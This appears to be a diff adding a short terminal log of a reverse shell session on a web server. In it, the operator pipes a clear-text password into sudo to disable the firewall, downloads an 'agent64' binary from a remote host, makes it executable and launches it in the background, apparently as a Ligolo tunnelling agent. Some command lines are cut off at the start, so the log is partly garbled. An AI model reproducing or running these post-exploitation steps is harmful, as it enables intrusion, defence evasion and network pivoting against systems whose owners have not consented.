@@ -1,0 +1,11 @@
+bash: cannot set terminal process group (1481): Inappropriate ioctl for device
+bash: no job control in this shell
+webadmin@odyssey-web:~/aegis$ <echo 'opc0932k90%%lODFI93-++' | sudo -S ufw disable
+[sudo: authenticate] Password: 
+Firewall stopped and disabled on system startup
+webadmin@odyssey-web:~/aegis$ <SL -o /tmp/agent64 http://10.10.15.183:8090/agent64
+webadmin@odyssey-web:~/aegis$ chmod +x /tmp/agent64 && ls -la /tmp/agent64
+-rwxr-xr-x 1 webadmin webadmin 6475928 Aug 30 19:11 /tmp/agent64
+webadmin@odyssey-web:~/aegis$ <10.15.183:11601 -ignore-cert >/tmp/agent.log 2>&1 &
+[1] 4441
+webadmin@odyssey-web:~/aegis$ <nt.log; ps aux | grep '[a]gent64'; echo DONE_LIGOLO
